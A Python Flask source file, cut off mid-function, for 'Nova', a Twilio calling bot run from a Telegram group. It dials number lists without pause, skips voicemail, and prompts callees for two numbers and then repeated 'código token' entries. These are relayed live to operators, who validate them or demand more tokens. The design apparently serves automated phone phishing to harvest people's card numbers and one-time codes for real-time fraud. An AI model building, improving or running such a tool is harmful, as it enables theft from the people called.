"""Nova - bot de llamadas telefonicas con validacion desde Telegram.

Flujo de cada llamada:
    /voice/start
      -> pide el primer numero   -> guarda y notifica a Telegram
      -> /voice/fase1 (espera)   -> ✅ validar   => pide el tercer numero
                                 -> ❌ invalidar => vuelve al primer numero
      -> /voice/fase2 (espera)   -> ✅ validar   => despedida + hangup
                                 -> ❌ invalidar => repite el tercer numero

Los comandos /llamar, /ciclos, /apagar y /estado llegan por el webhook de Telegram.

/ciclos mantiene varias llamadas a la vez (por defecto 5) y, en cuanto una cuelga,
marca la siguiente de la lista: nunca deja de llamar. Se para con /apagar.
"""

import os
import threading
import time
from datetime import datetime
from urllib.parse import quote

import requests
from flask import Flask, jsonify, request
from twilio.rest import Client
from twilio.twiml.voice_response import Gather, VoiceResponse

import config as cfg
import bd

app = Flask(__name__)

twilio_client = Client(
    cfg.TWILIO_ACCOUNT_SID or "AC_PLACEHOLDER",
    cfg.TWILIO_AUTH_TOKEN or "PLACEHOLDER",
)

# Estado de cada llamada en curso, indexado por el CallSid de Twilio.
llamadas_activas: dict[str, dict] = {}
lock_llamadas = threading.RLock()

# CallSid de llamadas YA RESUELTAS (cerradas/colgadas). Twilio puede mandar
# avisos de estado TARDIOS o repetidos DESPUES de que la llamada terminó (p. ej.
# un 'in-progress' que llega fuera de orden, llevado por la red). Si no se
# recuerda que esa llamada ya se cerró, el aviso tardío vuelve a crear la ficha:
# un "panel fantasma" con `✅ Contestó` y la duración clavada en `00:00`, como si
# hubiera una llamada viva que nunca avanza. Con esto, cualquier aviso de voz de
# un CallSid ya resuelto se IGNORA en vez de resucitar el panel.
resueltas: set[str] = set()
# Tope de la lista (evita crecer sin límite en un proceso de muchos días). Se
# guardan solo los últimos CallSid resueltos, que es lo más que puede llegar
# tarde (Twilio reintenta segundos/minutos, no días).
MAX_RESUELTAS = 500

# --- Veredicto de la detección de buzón (AMD de Twilio) ----------------------
# Solo estos valores son una MÁQUINA SEGURA (buzón de voz o fax): con ellos se
# cuelga de inmediato, sin dejar mensaje.
MAQUINAS_SEGURAS = frozenset(
    {
        "machine_start",
        "machine_end_beep",
        "machine_end_silence",
        "machine_end_other",
        "fax",
    }
)
# Valores que SÍ son un humano claro.
HUMANOS = frozenset({"human"})
# 💡 'unknown' NO está en ninguna de las dos listas a propósito. Significa "la
# AMD no alcanzó a decidir": Twilio se rindió tras MAQUINA_DETECCION_TIMEOUT
# segundos. NO es prueba de buzón. Antes se colgaba con 'unknown' y eso cortaba
# llamadas de HUMANOS REALES que tardaban >3 s en decir "aló" (bug visto en
# +573000000002: el panel mostraba `✅ Contestó` y `📵 contestó un buzón` con
# `⏱️ Duró: 00:03`, justo el timeout). Regla nueva: un 'unknown' SIN datos
# marcados se deja seguir (la red de seguridad de `MAX_INTENTOS_ENTRADA` cuelga
# al buzón unos segundos después, sin dejar mensaje); un 'unknown' DESPUÉS de
# recibir números se colgó solo con que el operador pulse `🛑 Colgar`.
# Referencia: https://www.twilio.com/docs/voice/answering-machine-detection
ESTADO_DUDOSO = "📵 sin confirmar humano (AMD dudosa) — sigue el flujo"
ESPERANDO_HUMANO_TXT = "¿aló?"
NOTA_AMD_DUDOSA = "🟡 Twilio no confirmó que fuera un humano (AMD dudosa)"

INICIADA = "iniciada"
ESPERANDO_1_2 = "esperando_1_2"
APROBADO_1_2 = "aprobado_1_2"
RECHAZADO_1_2 = "rechazado_1_2"
ESPERANDO_3 = "esperando_3"
APROBADO_FINAL = "aprobado_final"
RECHAZADO_3 = "rechazado_3"
# El operador pidió otro token (token4, token5...) en vez de reiniciar el proceso.
PIDIENDO_MAS = "pidiendo_mas"
COLGADO = "colgado"

# --- Los DOS estados que se ven en el panel (luz verde / luz roja) -------------
# El usuario pidió que el panel sea BIESTADO y claro: verde mientras la llamada
# vive (marcando o en llamada) y rojo cuando se cuelga. Todo lo demás (las fases,
# el token inválido, "esperando tu validación"...) va en la línea `nota`, NO en la
# línea de estado: así la luz nunca se confunde con un paso intermedio.
ESTADO_MARCANDO = "🟢 marcando"
ESTADO_EN_LLAMADA = "🟢 en llamada"
ESTADO_COLGADO = "🔴 colgado"

ACCIONES = {
    "validar12": (APROBADO_1_2, "✅ Números iniciales validados."),
    "invalidar12": (RECHAZADO_1_2, "❌ Números iniciales invalidados."),
    "validar3": (APROBADO_FINAL, "✅ Código token validado."),
    "invalidar3": (RECHAZADO_3, "❌ Código token invalidado."),
    # El operador prefiere seguir pidiendo tokens (4.o, 5.o...) en vez de reiniciar.
    "pedirmas": (PIDIENDO_MAS, "🔁 Se pedirá otro código token."),
    "colgar": (COLGADO, "🛑 Llamada colgada."),
}


# ---------------------------------------------------------------- TELEGRAM ---


def _api_telegram(metodo: str) -> str:
    return f"{cfg.TELEGRAM_API_URL}/bot{cfg.TELEGRAM_BOT_TOKEN}/{metodo}"


# Ruta publica a la que Telegram debe mandar los mensajes/callbacks del grupo.
# (El valor vive en config.py para que el registro manual y el automatico del
# arranque no se desincronicen nunca.)
RUTA_WEBHOOK = cfg.RUTA_WEBHOOK

# Tipos de aviso que Nova necesita. Mismo juego que registrar_webhook.py.
ALLOWED_UPDATES = cfg.ALLOWED_UPDATES

# Vigilante del webhook (mismo patron que el de llamadas: UNA bandera por
# proceso + su candado) para que no se lancen dos revisiones a la vez.
_webhook_lock = threading.Lock()
_webhook_activo = [False]


def _asegurar_webhook_telegram(silencioso: bool = False) -> bool:
    """Deja el webhook de Telegram apuntando a la URL publica actual.

    Devuelve True si tuvo que RE-REGISTRAR (habia algo que arreglar) y False si
    ya estaba bien o no se pudo comprobar. Con `silencioso=True` (lo usa el
    vigilante periodico) solo habla si de verdad repara algo: asi la revision de
    cada minuto no llena la consola.

    POR QUE EXISTE: si el servidor se apaga (o arranca) mientras Telegram
    intenta entregar, Telegram recibe un 404, marca el error y entra en su
    propio 'backoff' (espera cada vez mas). El puntero del webhook queda
    correcto en el papel, asi que un `setWebhook` normal contesta 'Webhook is
    already set' y NO reinicia nada: los mensajes se ACUMULAN en la cola
    (`pending_update_count` sube) y el grupo se queda sin respuestas aunque el
    servidor ya este sano (el sintoma 'el bot no arranca').

    Por eso, si la URL no coincide O Telegram venia fallando, se hace
    `deleteWebhook` + `setWebhook` (probado: es lo unico que limpia el error y
    destraba la cola) y se descarta la cola vieja, que ya no sirve.

    Se llama al arrancar y en un hilo aparte: no debe demorar `app.run`.
    """
    if not cfg.TELEGRAM_BOT_TOKEN:
        return False
    try:
        url = cfg.webhook_base_url() + RUTA_WEBHOOK
    except cfg.SinUrlPublicaError:
        return False

    try:
        info = (requests.get(_api_telegram("getWebhookInfo"), timeout=10).json()
                .get("result")) or {}
    except Exception as exc:  # noqa: BLE001
        if not silencioso:
            print(f"[telegram] no se pudo consultar el webhook: {exc}")
        return False

    actual = (info.get("url") or "").strip()
    error = info.get("last_error_message")
    cola = info.get("pending_update_count") or 0
    if actual == url and not error:
        if not silencioso:
            print(f"[telegram] webhook al dia: {url}")
        return False

    print(
        f"[telegram] webhook desactualizado (url={actual or 'ninguna'}, "
        f"error={error}, cola={cola}); re-registrando -> {url}"
    )
    try:
        # Borrar y volver a poner es lo unico que reinicia la entrega de Telegram.
        requests.post(_api_telegram("deleteWebhook"), timeout=10)
        r = requests.post(
            _api_telegram("setWebhook"),
            json={
                "url": url,
                "drop_pending_updates": True,
                "allowed_updates": list(ALLOWED_UPDATES),
            },
            timeout=10,
        ).json()
    except Exception as exc:  # noqa: BLE001
        print(f"[telegram] no se pudo registrar el webhook: {exc}")
        return False
    if r.get("ok"):
        print(f"[telegram] webhook registrado: {url}")
    else:
        print(f"[telegram] Telegram rechazo el webhook: {r.get('description')}")
    return bool(r.get("ok"))


def _vigilar_webhook() -> None:
    """Revisa el webhook cada `cfg.INTERVALO_WEBHOOK` y lo repara si hace falta.

    Un fallo POSTERIOR al arranque (el tunel de ngrok parpadeo, se perdio la red
    un momento...) vuelve a dejar a Telegram en 'backoff' con el puntero
    correcto: sin esta revision, el grupo se quedaria mudo hasta reiniciar a
    mano. Va en silencio cuando todo esta bien para no llenar la consola.
    """
    while True:
        time.sleep(max(30, cfg.INTERVALO_WEBHOOK))
        try:
            _asegurar_webhook_telegram(silencioso=True)
        except Exception as exc:  # noqa: BLE001
            # El vigilante NUNCA debe morir: si un fallo raro lo tumbara, dejaría
            # de reparar el webhook para siempre. Se avisa y se sigue.
            print(f"[telegram] el vigilante del webhook tuvo un fallo: {exc}")


def _arrancar_vigilante_webhook() -> None:
    """Lanza UN vigilante del webhook por proceso (idempotente).

    Mismo patron que `_arrancar_vigilante`: en las pruebas (sin hilos) no arranca
    nada, y con INTERVALO_WEBHOOK = 0 se desactiva (solo se revisa al arrancar).
    """
    if not _EN_HILO or cfg.INTERVALO_WEBHOOK <= 0:
        return
    with _webhook_lock:
        if _webhook_activo[0]:
            return
        _webhook_activo[0] = True
    threading.Thread(
        target=_vigilar_webhook, daemon=True, name="vigilante-webhook"
    ).start()


# --- Concurrencia ---------------------------------------------------------------
# Telegram y la base de datos pueden tardar (red). Las rutas de VOZ no deben
# esperarlos: Twilio necesita el TwiML YA, o quien llama oye silencio y con
# varias llamadas a la vez el servidor se atasca. Todo lo lento va a un hilo.
_EN_HILO = True  # las pruebas locales lo ponen en False (todo sincrono)


def _en_hilo(func, *args, **kwargs) -> None:
    """Ejecuta 'func' en un hilo aparte (para no demorar la respuesta a Twilio).

    Las pruebas locales ponen servidor._EN_HILO = False para que todo corra en
    el mismo hilo y los resultados sean deterministas.
    """
    if not _EN_HILO:
        func(*args, **kwargs)
        return
    threading.Thread(target=func, args=args, kwargs=kwargs, daemon=True).start()


# --- Orden de las ediciones del panel ----------------------------------------
# En producción cada refresco (`_tg_panel`) se aplica en su PROPIO hilo, así que
# dos refrescos seguidos (p. ej. el del número recién marcado y, justo después, el
# de la Fase 1 con sus botones) pueden llegar a Telegram EN DESORDEN. Si la
# edición VIEJA (sin los botones de validación) llega al final, BORRA el menú y el
# operador se queda sin poder validar (bug: "no me aparece el menú").
#
# Para que el resultado sea SIEMPRE el último refresco pedido, cada edición lleva
# un número de secuencia y se descartan las que lleguen más viejas que la última
# ya aplicada. `_panel_locks` serializa las ediciones de UNA MISMA llamada (los
# paneles de llamadas distintas no se estorban entre sí).
_panel_locks_guard = threading.Lock()
_panel_locks: dict[str, threading.Lock] = {}
_panel_aplicado: dict[str, int] = {}
# Tope de estos mapas (evita que crezcan sin límite en un proceso de muchos días).
# Es holgado: las ediciones de una llamada se aplican en segundos, así que cuando
# un CallSid se poda ya no le queda ninguna edición en vuelo.
MAX_PANELES = 500


def _podar_paneles() -> None:
    """Recorta los mapas de orden de edición a sus MAX_PANELES últimos."""
    with _panel_locks_guard:
        if len(_panel_aplicado) > MAX_PANELES:
            for viejo in list(_panel_aplicado)[: len(_panel_aplicado) - MAX_PANELES]:
                _panel_aplicado.pop(viejo, None)
        if len(_panel_locks) > MAX_PANELES:
            for viejo in list(_panel_locks)[: len(_panel_locks) - MAX_PANELES]:
                _panel_locks.pop(viejo, None)


def _panel_lock(call_sid: str) -> threading.Lock:
    """Lock por llamada para no aplicar dos ediciones de su panel a la vez."""
    with _panel_locks_guard:
        return _panel_locks.setdefault(call_sid, threading.Lock())


# --- Cierre de un panel que TODAVIA se estaba publicando ----------------------
# El mensaje del panel se manda en un hilo (la red de Telegram no debe demorar la
# respuesta de voz). En ese ratito la llamada puede TERMINAR: el cierre intenta
# pintar el panel en rojo, pero todavia NO hay `mensaje_id` (el mensaje va en
# camino), asi que no tiene nada que editar. Y cuando el hilo vuelve, la ficha ya
# se borro. Resultado (bug real): el mensaje recien publicado se quedaba VERDE
# para siempre, con `✅ Contestó` / `🟢 en llamada`, en una llamada que NUNCA se
# contesto (Twilio la cerro medio segundo despues).
#
# Solucion: el cierre APUNTA aqui su texto final (CallSid -> texto del cierre) y
# el hilo que publica, al terminar, pinta ese final sobre el mensaje que acaba de
# mandar. El mapa lo usan SOLO el cierre y ese hilo, siempre bajo `lock_llamadas`
# (el mismo candado en los dos lados): asi, o el cierre se anota antes y el hilo
# lo recoge, o el hilo ya guardo el `mensaje_id` y es el cierre quien pinta el
# rojo por `_tg_panel`. Nunca se pierden los dos.
_paneles_finales: dict[str, str] = {}

# Secuencia "imposible de superar" que se deja en el orden de ediciones de una
# llamada YA CERRADA: asi ninguna edicion vieja que siguiera en vuelo puede
# volver a pintar el panel ni borrarle el rojo del cierre.
_PANEL_FINAL = 10**9


def _anotar_final_pendiente(call_sid: str, texto_final: str) -> None:
    """Anota el rojo de un panel que aun se estaba publicando (ver arriba).

    Se llama SIEMPRE bajo `lock_llamadas`, igual que `_publicar_panel` cuando lo
    recoge. Se poda por tamano como los demas mapas del panel.
    """
    _paneles_finales[call_sid] = texto_final
    if len(_paneles_finales) > MAX_PANELES:
        for viejo in list(_paneles_finales)[: len(_paneles_finales) - MAX_PANELES]:
            _paneles_finales.pop(viejo, None)


def _leer_final_pendiente(call_sid: str) -> str | None:
    """Mira (sin consumir) si un cierre dejo anotado su rojo. Bajo `lock_llamadas`."""
    return _paneles_finales.get(call_sid)


def _pintar_final(call_sid: str, mensaje_id, texto_final: str) -> None:
    """Pinta el cierre sobre un panel recien publicado y anula ediciones viejas."""
    with _panel_lock(call_sid):
        _tg_editar_mensaje(
            cfg.TELEGRAM_GROUP_CHAT_ID,
            mensaje_id,
            texto_final,
            _con_colgar(call_sid, []),
        )
        _panel_aplicado[call_sid] = _PANEL_FINAL


def _tg_editar_panel(
    call_sid: str, chat_id, message_id, texto: str, teclado: list, secuencia: int
) -> None:
    """Aplica una edición del panel respetando el ORDEN en que se pidió.

    Hay DOS motivos para DESCARTA una edición vieja:

      * Si ya se aplicó una edición MÁS NUEVA (otro hilo se adelantó), esta se
        descarta: así una edición antigua no puede llegar después de la nueva y
        borrarle los botones al panel.
      * Si, mientras esta edición esperaba su turno, el servidor ya PIDIÓ otra
        MÁS NUEVA, esta también se descarta. Cada `editMessageText` tarda ~0,6 s
        (medido) y Telegram las encola: en una ráfaga real —recibir el número y,
        acto seguido, pasar a la Fase 1 con sus botones— se pedían 3-4
        ediciones seguidas y el panel con el número recién marcado tardaba
        segundos en verse (10 ediciones sin pausa = 12,4 s medidos). Ahora solo
        se pinta el ÚLTIMO estado pedido y el panel sale ya con la información
        del número recién marcado, sin hacer cola.

    El número de la última edición PEDIDA es `panel_secuencia` de la ficha (lo
    incrementa `_tg_panel` bajo `lock_llamadas`); esa edición es la que SIEMPRE
    se aplica (nunca queda descartada), así que el panel nunca se queda con un
    estado intermedio.
    """
    with _panel_lock(call_sid):
        if secuencia <= _panel_aplicado.get(call_sid, 0):
            return
        # ¿Se pidió ya una edición más nueva mientras esta esperaba el turno?
        # (`lock_llamadas` es un RLock y aquí NO se anida con `_panel_lock` en
        # ningún otro camino, así que no hay riesgo de bloqueo mutuo.)
        with lock_llamadas:
            llamada = llamadas_activas.get(call_sid)
            pedido = (llamada or {}).get("panel_secuencia", secuencia)
        if secuencia < pedido:
            # Este refresco pinta un estado intermedio que el siguiente pisaría
            # de todas formas: se salta (y se ahorra cupo de Telegram, cuyo 429
            # es lo que congelaba los paneles).
            return
        _tg_editar_mensaje(chat_id, message_id, texto, teclado)
        _panel_aplicado[call_sid] = secuencia


def _esperar_reintento(respuesta) -> bool:
    """Si Telegram contestó 429 ('Too Many Requests'), espera y pide reintentar.

    Con varias llamadas a la vez, los refrescos de los paneles chocan con el
    límite de mensajes por chat de Telegram y la API responde 429 con el tiempo
    que hay que esperar ('retry_after'). Si se ignora el 429, ese panel deja de
    actualizarse para siempre (se queda congelado). Aquí se respeta ese tiempo.
    """
    if respuesta is None or getattr(respuesta, "status_code", None) != 429:
        return False
    espera = 1
    try:
        datos = respuesta.json() or {}
        espera = int(((datos.get("parameters") or {}).get("retry_after")) or 1)
    except Exception:  # noqa: BLE001
        pass
    espera = max(1, min(espera, 30))
    print(f"[telegram] límite alcanzado; se reintenta en {espera}s")
    time.sleep(espera)
    return True


def _tg_mensaje(texto: str, teclado: list | None = None) -> int | None:
    """Manda un mensaje nuevo al grupo. Devuelve su message_id (para editarlo)."""
    cuerpo = {"chat_id": cfg.TELEGRAM_GROUP_CHAT_ID, "text": texto}
    if teclado:
        cuerpo["reply_markup"] = {"inline_keyboard": teclado}
    for _ in range(2):  # un reintento si Telegram pide esperar (429)
        try:
            r = requests.post(_api_telegram("sendMessage"), json=cuerpo, timeout=10)
            if _esperar_reintento(r):
                continue
            r.raise_for_status()
            return (r.json().get("result") or {}).get("message_id")
        except Exception as exc:
            print(f"[telegram] no se pudo enviar el mensaje: {exc}")
            return None
    print("[telegram] no se pudo enviar el mensaje: límite de Telegram alcanzado")
    return None


def _tg_editar_mensaje(
    chat_id, message_id, texto: str, teclado: list | None = None
) -> None:
    """Edita un mensaje ya enviado. Con teclado=[] le quita los botones.

    Se reintenta UNA vez si Telegram pide esperar (429): así el cronómetro de la
    llamada NO se queda congelado cuando hay varias llamadas a la vez.
    """
    cuerpo = {"chat_id": chat_id, "message_id": message_id, "text": texto}
    if teclado is not None:
        cuerpo["reply_markup"] = {"inline_keyboard": teclado}
    for _ in range(2):  # un reintento si Telegram pide esperar (429)
        try:
            r = requests.post(_api_telegram("editMessageText"), json=cuerpo, timeout=10)
            if _esperar_reintento(r):
                continue
            return
        except Exception as exc:
            print(f"[telegram] no se pudo editar el mensaje: {exc}")
            return
    print("[telegram] no se pudo editar el mensaje: límite de Telegram alcanzado")


def _tg_responder_boton(callback_id: str, texto: str = "") -> None:
    """Detiene el spinner del boton presionado en Telegram.

    El texto es opcional: si va vacio solo se cierra el spinner (util al cambiar
    de pagina, donde no hay nada que avisar).
    """
    cuerpo = {"callback_query_id": callback_id}
    if texto:
        cuerpo["text"] = texto
    try:
        requests.post(_api_telegram("answerCallbackQuery"), json=cuerpo, timeout=10)
    except Exception as exc:
        print(f"[telegram] no se pudo responder el boton: {exc}")


def _tg_documento(nombre: str, contenido: str, pie: str = "") -> None:
    """Manda un archivo de texto al grupo.

    Se usa para 'ver TODOS' los numeros: con 300+ numeros no caben en un mensaje
    de Telegram (limite de 4096 caracteres), pero si en un .txt descargable.
    """
    try:
        r = requests.post(
            _api_telegram("sendDocument"),
            data={"chat_id": cfg.TELEGRAM_GROUP_CHAT_ID, "caption": pie},
            files={"document": (nombre, contenido.encode("utf-8"), "text/plain")},
            timeout=20,
        )
        r.raise_for_status()
    except Exception as exc:
        print(f"[telegram] no se pudo enviar el documento: {exc}")


# --- Control de acceso: SOLO administradores --------------------------------
# Con esto ACTIVADO:
#   1) solo pueden usar el bot los IDs/@nombres de cfg.TELEGRAM_ADMIN_IDS /
#      TELEGRAM_ADMINS_USERNAMES, o (si esas listas están vacías) los que son
#      administradores del grupo autorizado (se pregunta con getChatMember);
#   2) si agregan a Nova a un grupo que NO esté autorizado, se sale sola.
# Las pruebas locales lo ponen en False para no depender de la red.
_AUTORIZAR_ACTIVO = True

# Resultado de getChatMember cacheado: (vence_en, es_admin). Así no se pregunta a
# Telegram en CADA botón pulsado (una llamada por clic sería lentísimo).
_CACHE_ADMINS: dict[tuple[str, str], tuple[float, bool]] = {}
_CACHE_ADMIN_SI = 300  # 5 min: quien ya es admin sigue siéndolo un rato
_CACHE_ADMIN_NO = 60   # 1 min: a un no-admin se le vuelve a preguntar pronto


def _es_admin_del_grupo(chat_id, usuario_id) -> bool:
    """Pregunta a Telegram si 'usuario_id' es administrador de 'chat_id'."""
    if not usuario_id:
        return False
    clave = (str(chat_id), str(usuario_id))
    ahora = time.time()
    guardado = _CACHE_ADMINS.get(clave)
    if guardado and ahora < guardado[0]:
        return guardado[1]
    try:
        r = requests.get(
            _api_telegram("getChatMember"),
            params={"chat_id": chat_id, "user_id": usuario_id},
            timeout=10,
        )
        r.raise_for_status()
        datos = r.json().get("result") or {}
        es = datos.get("status") in ("creator", "administrator")
    except Exception as exc:  # noqa: BLE001
        # Ante un fallo de red NO se autoriza (y no se cachea el fallo): así un
        # corte momentáneo no deja a un admin real fuera para siempre.
        print(f"[telegram] no se pudo comprobar el admin: {exc}")
        return False
    _CACHE_ADMINS[clave] = (ahora + (_CACHE_ADMIN_SI if es else _CACHE_ADMIN_NO), es)
    return es


def _autorizado(chat_id, usuario: dict | None) -> bool:
    """True si ese usuario puede usar el bot en ese grupo.

    Orden: listas explícitas del .env (IDs y @nombres) SIEMPRE mandan; si no
    aparece en ellas, solo pasa quien sea **administrador** del grupo.
    """
    if not _AUTORIZAR_ACTIVO:
        return True
    autor = usuario or {}
    usuario_id = autor.get("id")
    nombre = (autor.get("username") or "").lstrip("@").lower()
    if usuario_id is not None and str(usuario_id) in cfg.TELEGRAM_ADMIN_IDS:
        return True
    if nombre and nombre in cfg.TELEGRAM_ADMINS_USERNAMES:
        return True
    return _es_admin_del_grupo(chat_id, usuario_id)


def _tg_salir_del_chat(chat_id) -> None:
    """Saca a Nova de un grupo (leaveChat). Se usa para los NO autorizados."""
    try:
        requests.post(
            _api_telegram("leaveChat"), json={"chat_id": chat_id}, timeout=10
        )
    except Exception as exc:  # noqa: BLE001
        print(f"[telegram] no se pudo salir del chat: {exc}")


_ESTADOS_DENTRO = ("member", "administrator", "creator")
_TIPOS_GRUPO = ("group", "supergroup")


def _sacar_de_grupo_no_autorizado(chat: dict) -> None:
    """Si el chat NO está autorizado (y es un grupo), Nova se sale sola.

    Los chats privados no se pueden 'abandonar', así que ahí solo se ignora.
    """
    if not _AUTORIZAR_ACTIVO:
        return
    chat_id = str((chat or {}).get("id", ""))
    tipo = (chat or {}).get("type") or ""
    if tipo not in _TIPOS_GRUPO or cfg.chat_autorizado(chat_id):
        return
    print(f"[telegram] grupo NO autorizado ({chat_id}): Nova se sale.")
    _en_hilo(_tg_salir_del_chat, chat_id)


def _tramitar_membresia(actualizacion: dict) -> None:
    """Si agregan a Nova a un grupo NO autorizado, se sale de inmediato.

    Telegram avisa esto con el update 'my_chat_member' (por eso hay que tenerlo
    entre los allowed_updates del webhook).
    """
    if not _AUTORIZAR_ACTIVO:
        return
    nuevo = (actualizacion.get("new_chat_member") or {}).get("status") or ""
    if nuevo in _ESTADOS_DENTRO:
        _sacar_de_grupo_no_autorizado(actualizacion.get("chat") or {})


_PASOS_PANEL = (
    (1, "1️⃣ Número 1", "primero"),
    (2, "2️⃣ Número 2", "segundo"),
)


def _hora() -> str:
    """Hora local corta, estilo '10:04 p.m.'."""
    return (
        datetime.now()
        .strftime("%I:%M %p")
        .lstrip("0")
        .replace("AM", "a.m.")
        .replace("PM", "p.m.")
    )


def _duracion(llamada: dict) -> str:
    """Tiempo transcurrido en mm:ss; se congela cuando la llamada termina.

    Cuenta desde `inicio` (el arranque de la LLAMADA, cuando alguien contestó) y
    NO se reinicia al recibir números ni al cambiar de fase: una llamada de 2
    minutos marca 02:00, no 00:02.
    """
    inicio = llamada.get("inicio")
    if not inicio:
        return "00:00"
    segundos = max(0, int((llamada.get("fin") or time.time()) - inicio))
    return f"{segundos // 60:02d}:{segundos % 60:02d}"


def _desde_espera(llamada: dict) -> float:
    """Momento en que arrancó la espera de validación ACTUAL (fase1/fase2).

    Es distinto de `inicio` (arranque de la LLAMADA, base del cronómetro del
    panel): `inicio_espera` se reinicia al recibir el 2.o número y en cada
    intento del token. Así el tope `TIMEOUT_APROBACION` cuenta desde el ÚLTIMO
    dato recibido y NO desde que arrancó la llamada.
    """
    return llamada.get("inicio_espera") or llamada.get("inicio") or time.time()


def _texto_panel(llamada: dict) -> str:
    """Texto del UNICO mensaje de la llamada (se edita, no se duplica).

    Panel BIESTADO: mientras la llamada vive la luz es verde (`🟢 marcando` /
    `🟢 en llamada`) y al terminar SIEMPRE queda roja (`🔴 colgado` + el motivo
    en la línea `nota`). Las fases y los avisos ("Fase 1", "token inválido"...) no
    ensucian la línea de estado: van abajo, en la `nota`.

    La duración NO se muestra en vivo (nada se refresca cada segundo): solo sale
    UNA vez, al final, como "⏱️ Duró: MM:SS".
    """
    lineas = [f"📞 Llamada · {llamada.get('telefono') or 'número desconocido'}"]
    # Twilio avisa (status_callback 'answered') cuando el usuario CONTESTA:
    # se deja la hora en el panel para saber en qué momento cogió la llamada.
    if llamada.get("hora_contestada"):
        lineas.append(f"✅ Contestó: {llamada['hora_contestada']}")

    horas = llamada.get("horas") or {}
    for paso, etiqueta, clave in _PASOS_PANEL:
        valor = llamada.get(clave) or "—"
        hora = horas.get(paso)
        lineas.append(f"{etiqueta}: {valor}" + (f"  ·  {hora}" if hora else ""))

    # El código token se pide varias veces: una linea por intento.
    # No hay tope: si el operador pide otro token (4.o, 5.o...), se escribe abajo.
    intentos = llamada.get("terceros") or []
    total = max(len(intentos), cfg.INTENTOS_TERCERO)
    for i in range(total):
        prefijo = "3️⃣ " if i == 0 else "      "
        if i < len(intentos):
            registro = intentos[i]
            fila = f"Código token{i + 1}: {registro['valor']}  ·  {registro['hora']}"
        else:
            fila = f"Código token{i + 1}:"
        lineas.append(prefijo + fila)

    lineas.append("")
    lineas.append(f"Estado: {llamada.get('estado_txt') or ESTADO_EN_LLAMADA}")
    nota = llamada.get("nota")
    if nota:
        lineas.append(nota)
    # La duración SOLO se muestra al final (cuando la llamada ya se colgó): al no
    # haber cronómetro en vivo, el panel NO necesita refrescarse cada segundo.
    if llamada.get("fin"):
        lineas.append(f"⏱️ Duró: {_duracion(llamada)}")
    return "\n".join(lineas)


def _con_colgar(call_sid: str, teclado: list | None) -> list:
    """Devuelve el teclado con la fila '🛑 Colgar' SIEMPRE al final.

    Asi el boton de colgar sale en TODOS los paneles de la llamada (también en
    el de 'llamada finalizada'), sin duplicarlo si el teclado ya lo trae.
    """
    filas = [list(fila) for fila in (teclado or [])]
    ya_esta = any(
        (boton or {}).get("callback_data") == f"colgar_{call_sid}"
        for fila in filas
        for boton in fila
    )
    if not ya_esta:
        filas.append([{"text": "🛑 Colgar", "callback_data": f"colgar_{call_sid}"}])
    return filas


def _ficha_nueva(telefono: str, estado_txt: str = ESTADO_MARCANDO) -> dict:
    """Estado inicial de una llamada (una ficha por CallSid)."""
    return {
        "estado": INICIADA,
        "telefono": telefono,
        "primero": None,
        "segundo": None,
        "tercero": None,
        "intentos": 0,
        "intentos_tercero": 0,
        # `inicio`: arranque de la LLAMADA. Es la base de la duración que se
        #   muestra UNA vez al final ("⏱️ Duró: MM:SS") y NO se reinicia al
        #   recibir números ni al cambiar de fase: así una llamada de 2 min
        #   marca 02:00.
        "inicio": time.time(),
        # `inicio_espera`: arranque de la espera de validación ACTUAL (fase1/
        #   fase2). Sí se reinicia en cada fase y es lo que compara el tope
        #   TIMEOUT_APROBACION (nunca `inicio`).
        "inicio_espera": None,
        "horas": {},
        "terceros": [],
        "estado_txt": estado_txt,
        "nota": "",
        "fin": None,
        # 'latido': última señal de vida de la llamada (número marcado, decisión
        # tuya o sondeo de la voz). El vigilante cierra las que se quedan mudas.
        "latido": time.time(),
        "estado_final": False,
        "contestada": False,
        "hora_contestada": None,
        # True cuando ya arrancó el TwiML (/voice/start): los avisos de "sonar"
        # que lleguen tarde ya no deben pisar el estado del panel.
        "arrancado": False,
        "teclado": [],
        "chat_id": cfg.TELEGRAM_GROUP_CHAT_ID,
        "mensaje_id": None,
        # `panel_secuencia`: número de orden del ÚLTIMO refresco pedido del panel.
        # En producción cada edición va en su PROPIO hilo (ver `_en_hilo`), así que
        # dos refrescos seguidos pueden llegar a Telegram EN DESORDEN y una
        # edición VIEJA borraría los botones recién puestos (p. ej. el menú de
        # validación de la Fase 1/2). Con este contador, las ediciones se aplican
        # en orden por llamada (ver `_tg_editar_mensaje`) y la última pedida es la
        # que queda. Ver `_tg_panel`.
        "panel_secuencia": 0,
    }


def _abrir_panel(call_sid: str, telefono: str, estado_txt: str = ESTADO_MARCANDO) -> bool:
    """Abre (o refresca) el panel de Telegram de una llamada.

    El panel se abre al CONTESTAR la llamada (`🟢 en llamada`): mientras suena
    ('initiated'/'queued'/'ringing') NO se manda nada al grupo, así no se llena
    de llamadas que nadie contesta. Lo abre el aviso 'in-progress' del status
    callback o, si se adelantó, /voice/start. Si el panel ya existe NO manda otro
    mensaje: reutiliza el mismo y solo refresca el teléfono/estado. Devuelve
    True si el panel es nuevo.
    """
    with lock_llamadas:
        llamada = llamadas_activas.get(call_sid)
        if llamada is None and call_sid in resueltas:
            # Esta llamada YA se cerro (un aviso de fin se adelanto al arranque):
            # abrir su panel ahora dejaria un panel VERDE de una llamada que ya
            # termino. No se abre nada (evita el "panel fantasma").
            return False
        # panel_enviando: el envio del mensaje esta EN CURSO en otro hilo (p.ej.
        # 'in-progress' y /voice/start llegaron a la vez); no se duplica el panel.
        nuevo = llamada is None or (
            llamada.get("mensaje_id") is None and not llamada.get("panel_enviando")
        )
        if llamada is None:
            llamada = _ficha_nueva(telefono, estado_txt)
            llamadas_activas[call_sid] = llamada
        else:
            if telefono:
                llamada["telefono"] = telefono
            # Solo se pisa el estado si la llamada NO esta ya en un paso mas
            # avanzado (en llamada / fases): un aviso tardio no lo retrocede.
            if llamada.get("estado_txt") in (None, ESTADO_MARCANDO) or nuevo:
                llamada["estado_txt"] = estado_txt
        if nuevo:
            llamada["panel_enviando"] = True
        texto = _texto_panel(llamada)
    if not nuevo:
        # El otro camino (p.ej. 'in-progress') fue el que mando el mensaje; hay
        # que ESPERAR a que salga (panel_enviando) antes de mirar si la llamada
        # ya se cerro, o se volveria a publicar un panel verde. Se hace fuera del
        # candado: `_publicar_panel_seguro` decide (y manda el rojo) cuando toque.
        _en_hilo(_publicar_panel_seguro, call_sid, None)
        return False
    # Es ESTE camino el que manda el mensaje. Si al publicarlo la llamada ya se
    # cerro, `_publicar_panel_seguro` lo pinta en rojo en vez de dejarlo verde.
